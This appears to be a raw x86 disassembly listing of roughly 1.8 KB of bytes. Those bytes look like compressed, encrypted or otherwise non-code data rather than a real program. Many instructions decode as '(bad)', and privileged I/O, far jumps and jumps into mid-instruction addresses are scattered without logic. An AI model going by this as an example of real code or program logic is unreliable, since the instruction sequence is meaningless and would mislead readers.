  43c3b3:	stos   BYTE PTR es:[edi],al
  43c3b4:	cwde   
  43c3b5:	dec    edx
  43c3b6:	inc    ebp
  43c3b7:	fadd   QWORD PTR [ecx]
  43c3b9:	popa   
  43c3ba:	mov    fs,edx
  43c3bc:	add    BYTE PTR [edx+0x7826df7b],dh
  43c3c2:	out    dx,al
  43c3c3:	mov    dl,0x15
  43c3c5:	test   eax,0xcbc3ab1d
  43c3ca:	fbld   TBYTE PTR [eax+0x270b7551]
  43c3d0:	ror    BYTE PTR [esi],1
  43c3d2:	scas   eax,DWORD PTR es:[edi]
  43c3d3:	xor    BYTE PTR [ebp+0x2f],bl
  43c3d6:	in     al,dx
  43c3d7:	xchg   edx,eax
  43c3d8:	push   edi
  43c3d9:	ror    DWORD PTR [ecx],cl
  43c3db:	aam    0xa6
  43c3dd:	and    DWORD PTR [ecx+eiz*4-0x61ec6a97],0xffffffac
  43c3e5:	das    
  43c3e6:	test   al,0xa
  43c3e8:	pop    esi
  43c3e9:	sub    DWORD PTR [esi+0x3a47d0ef],esi
  43c3ef:	fcom   DWORD PTR [ebx+0x61]
  43c3f2:	scas   al,BYTE PTR es:[edi]
  43c3f3:	pop    ecx
  43c3f4:	inc    ebp
  43c3f5:	mov    esi,0xd95aecb2
  43c3fa:	out    dx,al
  43c3fb:	or     al,0xa7
  43c3fd:	or     eax,0x25fff362
  43c402:	ret    
  43c403:	mov    al,ds:0x116f4af3
  43c408:	adc    BYTE PTR [edi+0x4a],ch
  43c40b:	pop    ebp
  43c40c:	pop    esi
  43c40d:	(bad)  
  43c40f:	pop    esi
  43c410:	jnp    0x43c3dd
  43c412:	inc    esi
  43c413:	movsx  esp,WORD PTR [eax+0x2f]
  43c417:	pushf  
  43c418:	mov    esp,0x1b5e26ce
  43c41d:	and    al,0xe7
  43c41f:	xchg   esp,eax
  43c420:	das    
  43c421:	mov    edi,DWORD PTR [esi-0x5e]
  43c424:	mov    esp,eax
  43c426:	lea    ebp,[eax]
  43c428:	push   esi
  43c429:	xor    DWORD PTR [esi],ebx
  43c42b:	loop   0x43c43e
  43c42d:	push   ebx
  43c42e:	repz in al,dx
  43c430:	mov    ?,ebx
  43c432:	into   
  43c433:	xchg   DWORD PTR [edi+0x5fe91c12],esp
  43c439:	jg     0x43c409
  43c43b:	cmp    al,0xe9
  43c43d:	push   eax
  43c43e:	dec    esp
  43c43f:	je     0x43c4a2
  43c441:	rol    esi,1
  43c443:	xchg   ecx,eax
  43c444:	int3   
  43c445:	pusha  
  43c446:	or     BYTE PTR [ecx+0x6ba48bce],0xa6
  43c44d:	pop    es
  43c44e:	out    dx,al
  43c44f:	add    bh,BYTE PTR [esi]
  43c451:	jae    0x43c3ec
  43c453:	repnz inc ebx
  43c455:	cli    
  43c456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c457:	in     eax,dx
  43c458:	hlt    
  43c459:	addr16 dec edx
  43c45b:	mov    DWORD PTR [edi-0x48],ebx
  43c45e:	loope  0x43c496
  43c460:	cwde   
  43c461:	cmp    al,0x4e
  43c463:	pop    es
  43c464:	or     al,0x73
  43c466:	jmp    0x43c464
  43c468:	es xchg esp,eax
  43c46a:	xchg   edx,eax
  43c46b:	inc    esp
  43c46c:	(bad)  
  43c46d:	nop
  43c46e:	xor    ebx,DWORD PTR [esi]
  43c470:	test   BYTE PTR [ebp+0x49],bl
  43c473:	xchg   ebx,eax
  43c474:	rcl    dl,cl
  43c476:	ins    DWORD PTR es:[edi],dx
  43c477:	cdq    
  43c478:	sahf   
  43c479:	cwde   
  43c47a:	fcmovnb st,st(5)
  43c47c:	push   edx
  43c47d:	and    eax,0x4e530337
  43c482:	scas   al,BYTE PTR es:[edi]
  43c483:	pop    ecx
  43c484:	pop    esp
  43c485:	and    eax,DWORD PTR ds:0xa560c5fc
  43c48b:	mov    bl,0x7c
  43c48d:	sub    DWORD PTR [esi+0x104a24b],eax
  43c493:	jl     0x43c42a
  43c495:	fsubr  st,st(6)
  43c497:	push   ebp
  43c498:	pusha  
  43c499:	out    0xc0,al
  43c49b:	add    DWORD PTR [ecx+eiz*2],0x55a78437
  43c4a2:	inc    esi
  43c4a3:	cmp    BYTE PTR [esi-0x7],dl
  43c4a6:	out    dx,al
  43c4a7:	push   esp
  43c4a8:	sub    ch,0xb5
  43c4ab:	rcl    BYTE PTR [ecx],1
  43c4ad:	ss aas 
  43c4af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c4b0:	xchg   DWORD PTR [esi-0x6f],edi
  43c4b3:	mov    bh,0xb0
  43c4b5:	fadd   DWORD PTR [ebx-0x40]
  43c4b8:	xchg   esi,eax
  43c4b9:	clc    
  43c4ba:	add    eax,0x93ae5eb2
  43c4bf:	ins    DWORD PTR es:[edi],dx
  43c4c0:	jl     0x43c47d
  43c4c2:	mov    al,ds:0x55609147
  43c4c7:	ret    0x9f84
  43c4ca:	cmp    eax,0xeedcc0ac
  43c4cf:	xor    BYTE PTR [edi-0x3f734c0],bh
  43c4d5:	dec    ecx
  43c4d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c4d7:	test   al,0x6a
  43c4d9:	test   DWORD PTR [bp-0x4f62],esi
  43c4de:	in     al,dx
  43c4df:	arpl   WORD PTR [ebp+ebx*2+0x220b14ee],di
  43c4e6:	into   
  43c4e7:	push   ss
  43c4e8:	mov    cl,0x83
  43c4ea:	jb     0x43c4c9
  43c4ec:	retf   
  43c4ed:	imul   edi,edi,0xb9a11b58
  43c4f3:	xchg   edx,eax
  43c4f4:	shr    BYTE PTR [ebx],0xff
  43c4f7:	cdq    
  43c4f8:	pop    ebp
  43c4f9:	les    ebx,FWORD PTR [edi+eiz*1]
  43c4fc:	cmp    eax,0x3e490323
  43c501:	retf   
  43c502:	push   eax
  43c503:	mov    eax,ds:0x66456506
  43c508:	dec    ecx
  43c509:	call   0x6785d08c
  43c50e:	sbb    bx,WORD PTR [esi-0x24]
  43c512:	mov    eax,0x99f0de63
  43c517:	fisttp QWORD PTR [ebx-0x8]
  43c51a:	out    dx,al
  43c51b:	jbe    0x43c4b5
  43c51d:	idiv   ebp
  43c51f:	xor    ebp,DWORD PTR [esp+eiz*4-0x34405512]
  43c526:	xor    ebx,DWORD PTR [ebp-0x5f1c9362]
  43c52c:	repz jp 0x43c530
  43c52f:	dec    esi
  43c530:	test   eax,0x5f93bb5e
  43c535:	(bad)  
  43c536:	aad    0xfd
  43c538:	(bad)  
  43c539:	scas   al,BYTE PTR es:[edi]
  43c53a:	sub    BYTE PTR es:[esi+0x19539d79],bh
  43c541:	jb     0x43c59e
  43c543:	xor    edx,DWORD PTR [ebx+ebx*2-0x56d44612]
  43c54a:	jle    0x43c5a3
  43c54c:	xor    al,0x61
  43c54e:	xchg   ecx,eax
  43c54f:	test   BYTE PTR [edx-0x4bac8c23],dh
  43c555:	jo     0x43c559
  43c557:	dec    esi
  43c558:	xchg   esi,eax
  43c559:	xchg   edx,eax
  43c55a:	xor    edi,0x78fd3dd
  43c560:	mov    edx,0xafb3328b
  43c565:	xor    BYTE PTR [edi-0x58],al
  43c568:	mov    esi,0x1393c216
  43c56d:	mov    eax,ds:0x72cd2442
  43c572:	adc    bh,BYTE PTR [ebp+0x1b]
  43c575:	mov    ecx,0xc879e9ee
  43c57a:	cmp    eax,0xeb60173c
  43c57f:	iret   
  43c580:	push   0x2e
  43c582:	push   ss
  43c583:	mov    bh,0xa3
  43c585:	test   al,0x98
  43c587:	adc    bl,BYTE PTR [esi+0x31]
  43c58a:	or     edi,0x74
  43c58d:	push   ecx
  43c58e:	mov    dl,0x4b
  43c590:	iret   
  43c591:	pusha  
  43c592:	pop    edx
  43c593:	jmp    0xe5e4:0x3f342afb
  43c59a:	out    dx,al
  43c59b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c59c:	mov    cl,0x2b
  43c59e:	adc    BYTE PTR [edx+esi*2-0x155418e4],bh
  43c5a5:	pop    edi
  43c5a6:	outs   dx,BYTE PTR ds:[esi]
  43c5a7:	fmul   QWORD PTR [ebp+0x6f29bf49]
  43c5ad:	or     eax,0xc6ff4dee
  43c5b2:	cli    
  43c5b3:	cwde   
  43c5b4:	aad    0x9a
  43c5b6:	sub    eax,0x1b06eaa0
  43c5bb:	loope  0x43c5db
  43c5bd:	or     al,0x4f
  43c5bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c5c0:	les    ebp,FWORD PTR [ebx]
  43c5c2:	lock pop edi
  43c5c4:	sbb    esp,0xaadbc119
  43c5ca:	cld    
  43c5cb:	xchg   edi,eax
  43c5cc:	mov    WORD PTR [edx],fs
  43c5ce:	bound  esp,QWORD PTR [ecx-0x1ba5242b]
  43c5d4:	push   edx
  43c5d5:	(bad)  
  43c5d6:	xor    ah,dh
  43c5d8:	pop    esi
  43c5d9:	out    dx,eax
  43c5da:	rol    DWORD PTR [esi],1
  43c5dc:	test   al,0x40
  43c5de:	sti    
  43c5df:	mov    cl,0x87
  43c5e1:	pusha  
  43c5e2:	xchg   edx,eax
  43c5e3:	cwde   
  43c5e4:	out    dx,al
  43c5e5:	lahf   
  43c5e6:	push   ss
  43c5e7:	retf   
  43c5e8:	stc    
  43c5e9:	fld    TBYTE PTR [ecx+0x53]
  43c5ed:	in     eax,dx
  43c5ee:	imul   esi,DWORD PTR [ebx],0x57fa64de
  43c5f4:	arpl   WORD PTR [ebp-0x69],di
  43c5f7:	mov    eax,ds:0xc190f70b
  43c5fc:	push   edx
  43c5fd:	xor    BYTE PTR [eax+edx*8+0x1684c15e],cl
  43c604:	mov    bh,0x30
  43c606:	inc    ecx
  43c607:	stos   BYTE PTR es:[edi],al
  43c608:	shl    BYTE PTR [eax-0x4d],cl
  43c60b:	mov    DWORD PTR es:[edx+0x3],0xe3246147
  43c613:	leave  
  43c614:	pop    esi
  43c615:	les    ebx,FWORD PTR [eax+0x3]
  43c618:	in     al,0xb8
  43c61a:	les    ecx,FWORD PTR [edi-0xa]
  43c61d:	pusha  
  43c61e:	(bad)  
  43c61f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c620:	push   es
  43c621:	test   dl,al
  43c623:	lock arpl bx,bp
  43c626:	out    dx,al
  43c627:	push   eax
  43c628:	xchg   esp,ebx
  43c62a:	loop   0x43c5be
  43c62c:	fs ret 0xa06f
  43c630:	cld    
  43c631:	repz in eax,dx
  43c633:	fcomp  QWORD PTR [esi+0x6a]
  43c636:	sub    al,0x4c
  43c638:	mov    bl,0x5
  43c63a:	push   ss
  43c63b:	mov    ch,0x7a
  43c63d:	stos   DWORD PTR es:[edi],eax
  43c63e:	out    dx,al
  43c63f:	dec    edi
  43c640:	inc    edi
  43c641:	int    0xc7
  43c643:	sub    eax,0xa0c0e470
  43c648:	add    ebp,DWORD PTR [ebx+0x5848c58c]
  43c64e:	adc    eax,0xeee2ae90
  43c653:	ficomp DWORD PTR [esp+eiz*4]
  43c656:	push   0x6d437346
  43c65b:	mov    eax,ds:0xc612cb07
  43c660:	mov    WORD PTR [ecx],fs
  43c662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c663:	or     bl,BYTE PTR [esi-0x3e]
  43c666:	rcr    ch,0x23
  43c669:	jnp    0x43c60e
  43c66b:	ror    DWORD PTR [ebx],cl
  43c66d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c66e:	xchg   edi,eax
  43c66f:	mov    ds:0x2ec851ae,al
  43c674:	xor    eax,0x8578d6a7
  43c679:	enter  0x2aee,0xee
  43c67d:	jg     0x43c68d
  43c67f:	cwde   
  43c680:	adc    DWORD PTR [esp+ebx*4-0x7280ec5f],edi
  43c687:	stos   DWORD PTR es:[edi],eax
  43c688:	dec    esi
  43c689:	push   ebp
  43c68a:	xchg   esi,eax
  43c68b:	inc    esp
  43c68c:	pop    esi
  43c68d:	push   edx
  43c68e:	inc    ebp
  43c68f:	xchg   esp,eax
  43c690:	stc    
  43c691:	jl     0x43c6b3
  43c693:	aad    0xb9
  43c695:	pusha  
  43c696:	aam    0x9e
  43c698:	mov    bl,0xbe
  43c69a:	andnps xmm2,XMMWORD PTR [ecx+0x11]
  43c69e:	fadd   QWORD PTR [ecx]
  43c6a0:	pop    esi
  43c6a1:	lock repz mov bl,0x88
  43c6a5:	mov    ah,0x29
  43c6a7:	cmp    al,0x3d
  43c6a9:	popa   
  43c6aa:	adc    BYTE PTR [eax-0x463780d],0xb1
  43c6b1:	mov    eax,ds:0x6dc65cbe
  43c6b6:	out    dx,al
  43c6b7:	cwde   
  43c6b8:	lods   eax,DWORD PTR ds:[esi]
  43c6b9:	lock (bad) 
  43c6bb:	not    DWORD PTR [esi+eax*4-0x46]
  43c6bf:	mov    al,ds:0xeb8ac88d
  43c6c4:	ins    DWORD PTR es:[edi],dx
  43c6c5:	mov    ds:0xab5ea37b,eax
  43c6ca:	arpl   WORD PTR [ecx+ebp*8-0x7aa02154],si
  43c6d1:	lods   al,BYTE PTR ds:[esi]
  43c6d2:	daa    
  43c6d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c6d4:	loopne 0x43c6c8
  43c6d6:	xchg   esi,eax
  43c6d7:	or     al,0xc5
  43c6d9:	pop    es
  43c6da:	xchg   ebx,eax
  43c6db:	push   ecx
  43c6dc:	adc    DWORD PTR [eax],0x74
  43c6df:	imul   edi,DWORD PTR [esp+ecx*8+0x134ebbee],0xbb148eb2
  43c6ea:	dec    esi
  43c6eb:	mov    eax,ds:0x4061a206
  43c6f0:	fwait
  43c6f1:	(bad)  
  43c6f2:	cld    
  43c6f3:	inc    ebx
  43c6f4:	pop    esi
  43c6f5:	ds or  al,al
  43c6f8:	pop    ecx
  43c6f9:	push   0x73
  43c6fb:	(bad)  
  43c6fd:	popa   
  43c6fe:	mov    ds:0xfe825e79,al
  43c703:	mov    esi,0x63e2632a
  43c708:	pop    esi
  43c709:	xchg   ebp,eax
  43c70a:	xchg   esi,eax
  43c70b:	dec    esi
  43c70c:	scas   al,BYTE PTR es:[di]
  43c70e:	outs   dx,BYTE PTR ds:[esi]
  43c70f:	jg     0x43c69f
  43c711:	pusha  
  43c712:	or     esi,ebx
  43c714:	mov    ds:0x73479333,eax
  43c719:	sbb    ebp,esi
  43c71b:	push   es
  43c71c:	loope  0x43c6be
  43c71e:	ins    DWORD PTR es:[edi],dx
  43c71f:	xchg   esp,eax
  43c720:	in     eax,0x2d
  43c722:	fbld   TBYTE PTR [edi-0x564d3345]
  43c728:	inc    esp
  43c729:	xor    DWORD PTR [ecx+0x2980ade],edi
  43c72f:	repnz dec esi
  43c731:	(bad)  [esi+0x68]
  43c734:	in     eax,0x79
  43c736:	cmc    
  43c737:	ror    BYTE PTR [ecx-0x72cbc7a0],cl
  43c73d:	xchg   ebx,eax
  43c73e:	push   eax
  43c73f:	ja     0x43c719
  43c741:	or     DWORD PTR [esi+0x58bf642a],0xffffffd6
  43c748:	repnz popa 
  43c74a:	out    dx,al
  43c74b:	std    
  43c74c:	outs   dx,BYTE PTR ds:[esi]
  43c74d:	daa    
  43c74e:	push   edx
  43c74f:	adc    ebp,DWORD PTR gs:[edx+0x21]
  43c753:	mov    al,ds:0x4cd31f11
  43c758:	sahf   
  43c759:	call   0xcff1243d
  43c75e:	ret    0x6802
  43c761:	popa   
  43c762:	xchg   ecx,eax
  43c763:	xchg   ecx,eax
  43c764:	add    eax,0x61bebb29
  43c769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c76a:	xchg   ebx,eax
  43c76b:	mov    ah,0xb3
  43c76d:	push   esp
  43c76e:	push   es
  43c76f:	or     DWORD PTR [esi+0x5e7cc5bf],edi
  43c775:	pand   mm6,mm0
  43c778:	iret   
  43c779:	fnsave [ecx+0x54]
  43c77c:	sahf   
  43c77d:	pop    edi
  43c77e:	or     al,0x90
  43c780:	and    bh,bh
  43c782:	add    BYTE PTR [ecx],bh
  43c784:	mov    DWORD PTR [eax-0x42a19c38],edi
  43c78a:	ja     0x43c781
  43c78c:	popf   
  43c78d:	xchg   edi,eax
  43c78e:	push   ss
  43c78f:	popf   
  43c790:	fsub   DWORD PTR [eax+0x68]
  43c793:	mov    al,ds:0xaa1336af
  43c798:	xchg   ch,dl
  43c79a:	fisttp DWORD PTR es:0x8ba995e1
  43c7a1:	or     cl,BYTE PTR [ebx]
  43c7a3:	adc    edx,DWORD PTR [edi+0x5b222060]
  43c7a9:	mov    esi,0x717643a9
  43c7ae:	out    dx,al
  43c7af:	fmulp  st(4),st
  43c7b1:	scas   al,BYTE PTR es:[edi]
  43c7b2:	dec    ebp
  43c7b3:	push   0x46
  43c7b5:	mov    ecx,0x9445a10b
  43c7ba:	push   0x888be177
  43c7bf:	cwde   
  43c7c0:	pop    esi
  43c7c1:	lock aad 0x64
  43c7c4:	imul   eax,DWORD PTR [edx],0x9e5a58e0
  43c7ca:	sub    cl,BYTE PTR [ecx+0x36]
  43c7cd:	xor    DWORD PTR [esi-0x11f8ee98],esp
  43c7d3:	int3   
  43c7d4:	loop   0x43c835
  43c7d6:	dec    esp
  43c7d7:	outs   dx,BYTE PTR ds:[esi]
  43c7d8:	test   eax,0xf2f7d5de
  43c7dd:	lahf   
  43c7de:	sub    BYTE PTR [esi+0x61668f4d],dl
  43c7e4:	add    BYTE PTR [edx],bl
  43c7e6:	or     dh,BYTE PTR [esi-0x65]
  43c7e9:	icebp  
  43c7ea:	out    dx,al
  43c7eb:	fs mov bh,0x17
  43c7ee:	(bad)  
  43c7ef:	retf   
  43c7f0:	push   esp
  43c7f1:	inc    esp
  43c7f2:	in     eax,0xde
  43c7f4:	sub    eax,0x2e460660
  43c7f9:	push   ds
  43c7fa:	les    esp,FWORD PTR [eax-0x13]
  43c7fd:	sahf   
  43c7fe:	and    DWORD PTR [edx+edx*4+0x59],esi
  43c802:	sbb    BYTE PTR [esi-0x44],ah
  43c805:	repz dec esi
  43c807:	test   BYTE PTR gs:[ecx],0x2f
  43c80b:	mov    eax,ds:0x3907c70a
  43c810:	jecxz  0x43c7aa
  43c812:	imul   esp,edi,0x5e
  43c815:	(bad)  
  43c816:	iret   
  43c817:	pop    ebp
  43c818:	jge    0x43c829
  43c81a:	test   DWORD PTR [esi-0xb],eax
  43c81d:	pop    ecx
  43c81e:	test   BYTE PTR cs:[ebp-0x28],0xff
  43c823:	push   eax
  43c824:	int    0xad
  43c826:	aad    0x8a
  43c828:	pop    esi
  43c829:	add    eax,0x102a2525
  43c82e:	sbb    eax,0x46a52507
  43c833:	mov    eax,ds:0x7531e551
  43c838:	mov    eax,0x5fb6ebe7
  43c83d:	shl    BYTE PTR [ebp-0x1a],cl
  43c840:	es jae 0x43c7fe
  43c843:	xor    al,ch
  43c845:	cdq    
  43c846:	cld    
  43c847:	mov    ds:0xeb0cfc0c,eax
  43c84c:	outs   dx,BYTE PTR ds:[esi]
  43c84d:	(bad)  
  43c84e:	outs   dx,BYTE PTR ds:[esi]
  43c84f:	pop    ebp
  43c850:	sub    DWORD PTR [ebx-0x72ecc112],ecx
  43c856:	xchg   ecx,eax
  43c857:	pop    ss
  43c858:	mov    dl,0x79
  43c85a:	cmp    eax,0x3e235590
  43c85f:	and    ebp,edx
  43c861:	addr16 xchg edx,eax
  43c863:	div    DWORD PTR [edi+0x28]
  43c866:	out    dx,al
  43c867:	adc    eax,0x5f87cc84
  43c86c:	mov    esp,edx
  43c86e:	sahf   
  43c86f:	lahf   
  43c870:	pop    ss
  43c871:	jecxz  0x43c8d1
  43c873:	retf   0x6afe
  43c876:	aas    
  43c877:	sbb    DWORD PTR [esp+eax*1+0x62f46aee],ecx
  43c87e:	(bad)  
  43c87f:	jno    0x43c88c
  43c881:	xchg   esi,eax
  43c882:	xchg   esp,eax
  43c883:	out    dx,eax
  43c884:	pushf  
  43c885:	pop    ebx
  43c886:	cs ins BYTE PTR es:[edi],dx
  43c888:	mov    dh,ch
  43c88a:	ror    DWORD PTR [esi+0x5a14a0b9],0xce
  43c891:	add    DWORD PTR [edx],0x1a6250ec
  43c897:	pop    ss
  43c898:	pop    esi
  43c899:	or     eax,0x336ba045
  43c89e:	and    al,0xc5
  43c8a0:	inc    ebx
  43c8a1:	not    BYTE PTR [edi-0x5f]
  43c8a4:	adc    dl,BYTE PTR [ebp+0x41]
  43c8a7:	cli    
  43c8a8:	fwait
  43c8a9:	retf   0xa216
  43c8ac:	mov    ebp,DWORD PTR [edx-0x5cb54b12]
  43c8b2:	dec    ebx
  43c8b3:	stos   BYTE PTR es:[edi],al
  43c8b4:	add    BYTE PTR [ebx],ch
  43c8b6:	shl    DWORD PTR [eax-0x1d4a4aa9],cl
  43c8bc:	ins    BYTE PTR es:[edi],dx
  43c8bd:	in     al,dx
  43c8be:	test   esp,edx
  43c8c0:	pop    ebp
  43c8c1:	scas   eax,DWORD PTR es:[edi]
  43c8c2:	jg     0x43c92e
  43c8c4:	aam    0x54
  43c8c6:	jb     0x43c947
  43c8c8:	mov    cs,edx
  43c8ca:	inc    eax
  43c8cb:	mov    eax,ds:0x5269f471
  43c8d0:	aad    0x84
  43c8d2:	das    
  43c8d3:	sbb    DWORD PTR [esi+0x43],ebx
  43c8d6:	jmp    0x43c8fb
  43c8d8:	pop    es
  43c8d9:	mov    edx,0xf0b5dc60
  43c8de:	inc    ebp
  43c8df:	mov    eax,ds:0xc2e283cd
  43c8e4:	sub    al,0x97
  43c8e6:	xor    BYTE PTR ds:0x6955a252,cl
  43c8ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c8ed:	add    bh,bl
  43c8ef:	mov    al,ds:0x9bbe6de7
  43c8f4:	jb     0x43c926
  43c8f6:	add    edi,DWORD PTR [edi-0x5ef72843]
  43c8fc:	dec    eax
  43c8fd:	xor    DWORD PTR [eax+0x4ace53],ebx
  43c903:	(bad)  
  43c904:	mov    dh,0x64
  43c906:	out    dx,al
  43c907:	mov    ecx,0xdc8313f7
  43c90c:	(bad)
  43c910:	jb     0x43c974
  43c912:	push   ecx
  43c913:	nop
  43c914:	sbb    eax,DWORD PTR [ecx]
  43c916:	imul   ecx,DWORD PTR [edi+0x5e],0x90a469e4
  43c91d:	cld    
  43c91e:	aas    
  43c91f:	adc    edi,DWORD PTR [ebx+0x51]
  43c922:	xchg   esp,eax
  43c923:	bound  esp,QWORD PTR [edi-0xa]
  43c926:	mov    ds,WORD PTR [ebx+0x37]
  43c929:	cmp    al,0xc0
  43c92b:	mov    dh,0x5e
  43c92d:	call   FWORD PTR [edx+ebp*4+0x6b]
  43c931:	xchg   edi,eax
  43c932:	popa   
  43c933:	gs das 
  43c935:	popa   
  43c936:	xor    ch,BYTE PTR es:[ebp-0x67]
  43c93a:	jp     0x43c940
  43c93c:	pop    ecx
  43c93d:	sub    ebp,esi
  43c93f:	out    0x25,al
  43c941:	sbb    dl,BYTE PTR [ebp+0x74]
  43c944:	cmp    al,0x74
  43c946:	add    BYTE PTR [ecx-0x5ddb7ab7],dh
  43c94c:	movaps xmm5,xmm6
  43c94f:	ins    BYTE PTR es:[edi],dx
  43c950:	fidiv  WORD PTR [esi+0x779117a5]
  43c956:	mov    edx,0xf07b4aa0
  43c95b:	test   eax,0xd842c42a
  43c960:	push   eax
  43c961:	jmp    0x6ca2c5e4
  43c966:	lods   eax,DWORD PTR ds:[esi]
  43c967:	rcl    BYTE PTR [eax-0x105ed3c7],0x69
  43c96e:	dec    ebx
  43c96f:	sbb    BYTE PTR [eax],0x47
  43c972:	(bad)  
  43c973:	stos   BYTE PTR es:[edi],al
  43c974:	pop    esi
  43c975:	fsub   st(2),st
  43c977:	mov    ch,0x31
  43c979:	out    0xcc,eax
  43c97b:	sbb    eax,DWORD PTR [ebx+0x52]
  43c97e:	mov    ds,WORD PTR [ebx-0x5e5dc875]
  43c984:	and    bh,BYTE PTR [ebx-0x174a9710]
  43c98a:	out    dx,al
  43c98b:	pop    esi
  43c98c:	add    cl,BYTE PTR [ecx+0x73]
  43c98f:	mov    dl,0x4
  43c991:	sbb    ecx,ebp
  43c993:	les    ebx,FWORD PTR ds:0x69a17f9c
  43c999:	xor    esp,DWORD PTR ds:0xed652231
  43c99f:	(bad)  
  43c9a0:	repnz fist DWORD PTR [esi]
  43c9a3:	sete   BYTE PTR cs:[edx-0x57]
  43c9a8:	daa    
  43c9a9:	pop    edx
  43c9aa:	ins    BYTE PTR es:[edi],dx
  43c9ab:	pop    ds
  43c9ac:	cli    
  43c9ad:	cmp    eax,esi
  43c9af:	aaa    
  43c9b0:	in     eax,0x50
  43c9b2:	xor    cl,BYTE PTR [eax-0x60]
  43c9b5:	sub    al,0xf5
  43c9b7:	dec    edi
  43c9b8:	loop   0x43c93d
  43c9ba:	add    BYTE PTR [ecx+0x4d394d23],ah
  43c9c0:	inc    esp
  43c9c1:	popa   
  43c9c2:	stos   BYTE PTR es:[edi],al
  43c9c3:	inc    ebp
  43c9c4:	xchg   BYTE PTR [edx+0x542bdb0d],bh
  43c9ca:	out    dx,al
  43c9cb:	into   
  43c9cc:	cli    
  43c9cd:	repnz dec ebp
  43c9cf:	(bad)  
  43c9d0:	fsub   QWORD PTR [edx+0x2a]
  43c9d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c9d4:	hlt    
  43c9d5:	gs scas eax,DWORD PTR es:[edi]
  43c9d7:	inc    esp
  43c9d8:	lods   eax,DWORD PTR ds:[esi]
  43c9d9:	add    al,0x2e
  43c9db:	and    BYTE PTR [eax+0x1953eee9],al
  43c9e1:	fld    QWORD PTR [eax+esi*4-0x41]
  43c9e5:	rcl    cl,cl
  43c9e7:	out    dx,al
  43c9e8:	lock sub edx,ecx
  43c9eb:	mov    al,ds:0xc7221e9f
  43c9f0:	(bad)  
  43c9f1:	cmp    DWORD PTR [ecx+0x48],ebx
  43c9f4:	je     0x43ca75
  43c9f6:	cmc    
  43c9f7:	and    eax,0x21011129
  43c9fc:	xchg   ebp,eax
  43c9fd:	idiv   DWORD PTR [ecx]
  43c9ff:	and    al,0x54
  43ca01:	mov    cl,0xa1
  43ca03:	mov    eax,ds:0x844d1b50
  43ca08:	inc    edx
  43ca09:	xchg   ebx,eax
  43ca0a:	jge    0x43c9d7
  43ca0c:	cmp    BYTE PTR [ebx],al
  43ca0e:	jb     0x43c9b4
  43ca10:	cmp    al,0x97
  43ca12:	fdivr  QWORD PTR [edi+edx*4]
  43ca15:	loopne 0x43ca63
  43ca17:	mov    al,ds:0xe15942b4
  43ca1c:	in     al,0xe0
  43ca1e:	mov    bh,0x91
  43ca20:	pop    es
  43ca21:	out    dx,eax
  43ca22:	dec    edx
  43ca23:	pop    ss
  43ca24:	pop    esi
  43ca25:	mov    ch,0x89
  43ca27:	adc    DWORD PTR [edi-0x41],esi
  43ca2a:	fst    QWORD PTR [ebp-0x4f329f46]
  43ca30:	sub    DWORD PTR [edx+0x41],edi
  43ca33:	mov    ch,0x6b
  43ca35:	and    bh,0x36
  43ca38:	jmp    0x43c9f2
  43ca3a:	lods   al,BYTE PTR ds:[esi]
  43ca3b:	nop
  43ca3c:	mov    esi,0x1c3e845f
  43ca41:	popa   
  43ca42:	inc    ebx
  43ca43:	ins    DWORD PTR es:[edi],dx
  43ca44:	test   DWORD PTR [edx],eax
  43ca46:	in     al,0xc8
  43ca48:	and    al,0x8a
  43ca4a:	push   esp
  43ca4b:	sbb    bl,BYTE PTR [esi-0x52]
  43ca4e:	xor    dl,BYTE PTR [edi+0x5c]
  43ca51:	loopne 0x43cac2
  43ca53:	lea    eax,[edx-0x23c5c6a0]
  43ca59:	loopne 0x43ca25
  43ca5b:	call   0x7f31ef81
  43ca60:	ins    DWORD PTR es:[edi],dx
  43ca61:	jbe    0x43ca23
  43ca63:	clc    
  43ca64:	xor    DWORD PTR [eax+ebp*4-0x7db54160],edx
  43ca6b:	sbb    ebp,0x5eda588f
  43ca71:	repz push ebp
  43ca73:	dec    ecx
  43ca74:	fwait
  43ca75:	pop    ebp
  43ca76:	int    0x15
  43ca78:	add    edx,DWORD PTR [edx-0x7c]
  43ca7b:	xor    al,0x29
  43ca7d:	mov    ds:0xd29ec00e,al
  43ca82:	jne    0x43cab2
  43ca84:	xchg   BYTE PTR [ebx-0x1b],dl
  43ca87:	cmc    
  43ca88:	pop    esi
  43ca89:	aaa    
  43ca8a:	je     0x43ca96
  43ca8c:	pop    es
  43ca8d:	mov    ds:0x609d5d8c,eax
  43ca92:	jns    0x43cabd
  43ca94:	fcmovnu st,st(0)
  43ca96:	adc    al,0x9b
  43ca98:	mov    ch,0x88
  43ca9a:	out    dx,al
  43ca9b:	lock pusha 
  43ca9d:	in     al,0xe0
  43ca9f:	leave  
  43caa0:	adc    bh,BYTE PTR [eax]
  43caa2:	and    BYTE PTR [ecx-0x5fb6ff8e],0xde
  43caa9:	cmp    cl,BYTE PTR [ebx+0x54f8c9]
  43caaf:	(bad)  
  43cab0:	mov    ecx,0xa9d9ae69
  43cab5:	mov    esp,cs
  43cab7:	jmp    0xd5b6:0x4bd860e1
  43cabe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cabf:	adc    al,0xe5
  43cac1:	mov    ds:0x4016b862,eax
  43cac6:	nop
  43cac7:	test   al,0xbf
  43cac9:	shl    eax,0x41
  43cacc:	out    dx,al
  43cacd:	ss mov ebx,0xf8607fc6
  43cad3:	ja     0x43caca
  43cad5:	pop    ds
  43cad6:	sub    eax,0x1051738a
  43cadb:	aad    0xeb
  43cadd:	adc    al,0xed
  43cadf:	fstp   TBYTE PTR [ebp-0x3c]
  43cae2:	sbb    BYTE PTR [eax+0x72],cl
  43cae5:	call   0x56226c5f
  43caea:	adc    eax,0x20ba7573
  43caef:	in     al,0x5e
